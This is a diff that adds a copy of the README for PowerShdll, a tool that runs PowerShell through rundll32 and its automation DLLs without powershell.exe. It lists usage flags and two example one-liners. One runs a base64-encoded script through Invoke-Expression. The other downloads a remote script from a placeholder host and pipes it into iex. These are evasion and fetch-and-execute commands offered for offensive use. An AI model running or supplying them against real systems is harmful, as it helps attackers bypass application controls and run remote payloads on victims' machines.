@@ -1,0 +1,27 @@
+https://github.com/p3nt4/PowerShdll
+
+PowerShdll
+Run PowerShell with dlls only. Does not require access to powershell.exe as it uses powershell automation dlls.
+
+dll mode:
+
+Usage:
+rundll32 PowerShdll,main <script>
+rundll32 PowerShdll,main -f <path>       Run the script passed as argument
+rundll32 PowerShdll,main -w      Start an interactive console in a new window
+rundll32 PowerShdll,main -i      Start an interactive console in this console
+If you do not have an interractive console, use -n to avoid crashes on output
+exe mode
+
+Usage:
+PowerShdll.exe <script>
+PowerShdll.exe -f <path>       Run the script passed as argument
+PowerShdll.exe -i      Start an interactive console in this console
+Examples
+
+Run base64 encoded script
+
+rundll32 Powershdll.dll,main $a = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("BASE64")); Invoke-Expression $a
+Download and run script
+
+rundll32 PowerShdll.dll,main . { iwr -useb https://website.com/Script.ps1 } ^| iex;
